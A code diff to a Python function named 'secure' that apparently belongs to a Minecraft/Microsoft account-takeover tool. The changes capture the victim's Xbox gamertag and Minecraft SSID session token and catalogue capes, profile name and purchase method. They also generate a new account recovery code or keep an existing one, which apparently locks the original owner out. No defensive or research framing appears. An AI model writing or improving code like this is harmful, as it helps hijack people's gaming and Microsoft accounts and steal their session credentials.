@@ -63,39 +63,44 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     if XBLResponse:
         print("[+] - Got XBL (Has Xbox Profile)")
 
-        # XBL && Token
         xbl = XBLResponse["xbl"]
+        gtg = XBLResponse.get("gtg")
+        if gtg:
+            account_info["minecraft"]["gamertag"] = gtg
 
         ssid = await get_ssid(xbl)
-        
-        # Get capes, profile and purchase method
-        if ssid:    
-            print("[+] - Got SSID! (Has Minecraft)")
 
-            capes = await get_capes(ssid)
+        if ssid:
+            print("[+] - Got SSID! (Has Minecraft)")
+            account_info["minecraft"]["SSID"] = ssid
+
+            try:
+                capes = await get_capes(ssid)
+            except Exception:
+                capes = []
             if capes:
-                account_info["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
+                account_info["minecraft"]["capes"] = ", ".join(
+                    i.get("alias", i.get("id", "Unknown")) for i in capes
+                )
                 print(f"[+] - Got capes")
             else:
                 account_info["minecraft"]["capes"] = "No capes"
 
-            # Gets account name
             profile = await get_profile(ssid)
-            if not profile:
-                print("[x] - Failed to get profile (No Minecraft Java)")
-            else:
+            if profile:
                 print(f"[+] - Got profile (Has Minecraft Java)")
-                account_info["minecraft"]["SSID"] = ssid
                 account_info["minecraft"]["name"] = profile
-                
-                # Wether its changeable
+
                 usernameInfo = await get_username_info(ssid)
                 if not usernameInfo:
                     account_info["minecraft"]["uchange"] = "Yes"
                 else:
                     account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
+            else:
+                print("[x] - No Java profile (Bedrock/Game Pass only)")
+                account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
+                account_info["minecraft"]["uchange"] = "N/A"
 
-            # Minecraft purchase method
             method = await get_method(ssid)
             if method:
                 account_info["minecraft"]["method"] = method
@@ -146,12 +151,26 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     
     encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
 
-    # Gets recovery code
-    recovery_code = await get_recovery_code(
-        session,
-        apicanary,
-        encryptedNetID
-    )
+    existing_recovery = account_info["microsoft"].get("recovery_code")
+    has_recovery = existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")
+
+    if recovery or not has_recovery:
+        generated_code = await get_recovery_code(
+            session,
+            apicanary,
+            encryptedNetID
+        )
+        if generated_code:
+            recovery_code = generated_code
+        elif has_recovery:
+            recovery_code = existing_recovery
+        else:
+            recovery_code = "Failed to generate"
+            print("[X] - Failed to generate recovery code")
+    else:
+        recovery_code = existing_recovery
+        print(f"[+] - Keeping existing recovery code from recovery flow")
+
     print(f"[+] - Got Recovery Code | {recovery_code}")
 
     if minecon:
